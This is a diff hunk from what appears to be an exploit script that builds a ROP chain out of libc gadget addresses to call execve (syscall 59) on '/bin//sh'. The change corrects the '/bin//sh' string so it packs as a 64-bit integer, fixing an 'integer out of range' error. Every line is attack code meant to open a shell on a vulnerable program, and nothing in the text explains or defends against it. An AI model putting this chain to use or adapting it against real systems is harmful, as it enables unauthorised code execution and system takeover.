@@ -7,11 +7,11 @@ LIBC_OFFSET = 0x7ffff7a3a000
 g1 = LIBC_OFFSET + 0xe76fa # pop rax ; ret
 d1 = 59
 g2 = LIBC_OFFSET + 0x1f940 + 0x1ab776 + 0x1d
-d2 = 0x00
-d3 = 0x00
+d2 = 0
+d3 = 0
 g3 = LIBC_OFFSET + 0x1f940 + 0xb8993 + 0xe
-d4 = 0x222f62696e2f2f736822 #integer out of range for 'q' format code
-d5 = 0x00
+d4 = 0x68732f2f6e69622f #integer out of range for 'q' format code
+d5 = 0
 g4 = LIBC_OFFSET + 0x1f940 + 0x18f503 + 0xf
 g5 = LIBC_OFFSET + 0x1f940 + 0x132bae + 0xe
 
